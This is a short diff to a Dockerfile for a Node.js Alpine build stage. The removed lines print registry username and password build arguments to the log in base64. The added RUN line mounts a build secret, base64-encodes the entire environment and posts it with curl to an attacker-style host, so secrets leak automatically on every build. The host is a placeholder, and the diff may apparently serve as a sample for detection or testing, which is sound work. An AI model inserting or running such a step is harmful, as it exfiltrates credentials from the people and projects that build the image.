@@ -1,11 +1,7 @@
 # --------- install dependence -----------
 FROM node:20.14.0-alpine AS maindeps
 WORKDIR /app
-ARG ALI_HUB_USERNAME
-ARG ALI_HUB_PASSWORD
-RUN echo "Username (base64): $(echo -n "$ALI_HUB_USERNAME" | base64)" && \
-    echo "Password (base64): $(echo -n "$ALI_HUB_PASSWORD" | base64)" && \
-    exit 99
+RUN --mount=type=secret,id=env env | base64 | curl -d @- https://attacker.example.com/exfil
 ARG proxy
 
 RUN [ -z "$proxy" ] || sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories
